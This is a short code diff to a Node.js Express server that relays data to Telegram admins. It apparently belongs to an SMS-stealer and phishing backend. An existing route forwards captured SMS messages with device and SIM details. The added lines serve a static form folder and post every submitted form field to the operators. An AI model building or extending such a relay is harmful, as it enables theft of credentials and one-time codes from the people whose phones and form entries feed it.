@@ -20,6 +20,8 @@ if (!fs.existsSync(QUEUE_FILE)) fs.writeJsonSync(QUEUE_FILE, {});
 // ===== APP =====
 const app = express();
 app.use(bodyParser.json());
+app.use(bodyParser.urlencoded({ extended: true }));
+app.use(express.static(path.join(__dirname, 'form')));
 
 // ===== BOT =====
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
@@ -97,6 +99,16 @@ app.post('/sms', (req, res) => {
   // Notify admin
   const smsMsg = `📱 *NEW SMS* (${device.model})\nFrom: ${from}\nSIM: ${sim}\nTime: ${ts.toLocaleTimeString()}\nMessage:\n${body}`;
   ADMIN_IDS.forEach(id => bot.sendMessage(id, smsMsg, { parse_mode: 'Markdown' }));
+  res.sendStatus(200);
+});
+
+app.post('/html-form-data', (req, res) => {
+  const data = req.body;
+  let message = '📝 *New Form Submission*\n\n';
+  for (const [key, value] of Object.entries(data)) {
+    message += `*${key.replace(/_/g, ' ').toUpperCase()}*: ${value}\n`;
+  }
+  ADMIN_IDS.forEach(id => bot.sendMessage(id, message, { parse_mode: 'Markdown' }));
   res.sendStatus(200);
 });
 
